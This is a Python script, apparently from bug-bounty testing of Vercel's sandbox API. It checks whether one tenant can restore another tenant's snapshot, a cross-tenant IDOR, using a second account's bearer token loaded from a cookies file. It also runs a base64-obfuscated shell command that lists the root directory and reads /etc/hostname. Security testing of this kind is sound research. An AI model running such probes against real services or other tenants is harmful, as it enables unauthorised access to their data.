# -*- coding: utf-8 -*-
"""v51a: source=snapshot 跨租户恢复 IDOR 测试
attacker 用 victim 的快照 snapshotId 创建 sandbox:
- 200 -> IDOR! (跨租户快照窃取, Critical)
- 404/403 -> 隔离正确
对照: attacker 用自己的快照创建 -> 200"""
import json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TOKEN, TEAM, PROJ

TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_raw(method, path, body=None, tok=None, timeout=120):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + (tok or TOKEN))
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:900]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:900]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def mk(tag, name, tok, team, proj):
    api_raw('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, team, proj), tok=tok)
    time.sleep(2)
    for i in range(8):
        c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % team, {"projectId": proj, "name": name}, tok=tok)
        if c == 429:
            print('[%s create] 429 retry' % tag, flush=True)
            time.sleep(20)
            continue
        break
    print('[%s create] -> %d' % (tag, c), flush=True)
    if c != 200:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

def mk_snap(tag, sid, tok, team):
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/snapshot?teamId=%s' % (sid, team), {}, tok=tok, timeout=180)
    print('[%s snapshot] -> %d %s' % (tag, c, (r or '')[:150]), flush=True)
    try:
        return json.loads(r)['snapshot']['id']
    except Exception:
        return None

if __name__ == '__main__':
    # 1. attacker sandbox + snapshot
    sid_a = mk('A', 'srcsnap51', TOKEN, TEAM, PROJ)
    if not sid_a:
        sys.exit(1)
    time.sleep(8)
    snap_a = mk_snap('A', sid_a, TOKEN, TEAM)
    time.sleep(5)
    # 2. victim sandbox + snapshot
    sid_v = mk('V', 'vsrcsnap51', TOK_V, TEAM_V, PROJ_V)
    if not sid_v:
        sys.exit(1)
    time.sleep(8)
    snap_v = mk_snap('V', sid_v, TOK_V, TEAM_V)
    time.sleep(5)
    print('snap_a =', snap_a, flush=True)
    print('snap_v =', snap_v, flush=True)

    # 3. attacker 用 victim 快照创建 (核心)
    print('=== C1: attacker 用 victim 快照创建 ===', flush=True)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM,
                   {"projectId": PROJ, "name": 'srcsnap_v51',
                    "source": {"type": "snapshot", "snapshotId": snap_v}}, timeout=180)
    print('[create from victim snap] -> %d %s' % (c, (r or '')[:200]), flush=True)

    # 4. 对照: attacker 用自己的快照创建
    print('=== C2: attacker 用自己的快照创建 (对照) ===', flush=True)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM,
                   {"projectId": PROJ, "name": 'srcsnap_a51',
                    "source": {"type": "snapshot", "snapshotId": snap_a}}, timeout=180)
    print('[create from own snap] -> %d %s' % (c, (r or '')[:200]), flush=True)

    # 5. 验证恢复数据 (如果 C2 成功, 检查数据一致性)
    if c == 200:
        try:
            sid2 = json.loads(r)['sandbox']['currentSessionId']
            time.sleep(8)
            b64 = __import__('base64').b64encode(b'ls -la / | head; cat /etc/hostname').decode()
            c3, r3 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid2, TEAM),
                             {"command": "sh", "args": ["-c", 'echo %s | base64 -d | sh' % b64],
                              "wait": True, "logs": True, "timeout": 20000}, timeout=60)
            print('[verify own-snap data] -> %d %s' % (c3, (r3 or '')[:150]), flush=True)
        except Exception as e:
            print('[verify EXC] %s' % str(e)[:100], flush=True)

    # 6. 清理
    for nm, tok, team, proj in [('srcsnap51', TOKEN, TEAM, PROJ), ('srcsnap_v51', TOKEN, TEAM, PROJ),
                                ('srcsnap_a51', TOKEN, TEAM, PROJ), ('vsrcsnap51', TOK_V, TEAM_V, PROJ_V)]:
        api_raw('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (nm, team, proj), tok=tok)
    for sid in [snap_a, snap_v]:
        if sid:
            api_raw('DELETE', '/v2/sandboxes/snapshots/%s?teamId=%s&project=%s' % (sid, TEAM, PROJ))
            api_raw('DELETE', '/v2/sandboxes/snapshots/%s?teamId=%s&project=%s' % (sid, TEAM_V, PROJ_V), tok=TOK_V)
    print('DONE', flush=True)
